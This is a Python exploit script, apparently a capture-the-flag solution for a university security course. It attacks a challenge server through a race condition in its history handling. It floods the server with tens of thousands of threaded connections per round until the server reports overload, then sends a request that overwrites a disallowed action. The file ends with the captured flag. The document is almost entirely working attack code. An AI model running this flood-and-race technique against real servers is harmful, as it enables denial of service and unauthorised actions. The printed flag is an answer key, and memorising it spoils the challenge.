from pwn import *
import string
from sys import argv
import sys
import os
import time
import subprocess
import socket
import threading


host = "tasks.ws24.softsec.rub.de"
port = 33115


def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)





# vuln: add_to_history doesn't have semaphore
# history_size may have the same value in 2 different calls
# !nice action may be overwritten by nice action

too_many = False

def send_message(host, port):
    global too_many
    try:
        # Create a TCP/IP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect the socket to the server
        server_address = (host, port)
        sock.connect(server_address)
        
        try:
            # Send a message to the server
            #print(f"Sending message: {message}")
            #print(too_many)
            if too_many:
                sock.sendall(b"Get presents\n"+b"Eat your vegetables\n"*200)
                response = sock.recv(1024)
                if b"softsec" in response:
                    print(response)
            else:
                sock.sendall(b"Eat your vegetables\n"*200)
                response = sock.recv(1024)
                if b"Server is overloaded" in response:
                    too_many = True

            return response
        finally:
            # Close the socket
            sock.close()
    except Exception as e:
        pass #print(f"An error occurred: {e}")






def spawn_threads(num_threads, host, port):
    threads = []
    for i in range(num_threads):
        # Create a new thread for each message send operation
        thread = threading.Thread(target=send_message, args=(host, port))
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()


sys.stderr = open(os.devnull, 'w')

for i in range(1000):
    spawn_threads(50000, host, port)





#p.interactive()

#softsec{jrrib-Rdvm0fxw6AMfuxePrsoktB1bGDyXDrr4OYaDTfgzugiPAWHocaHReR8Rns}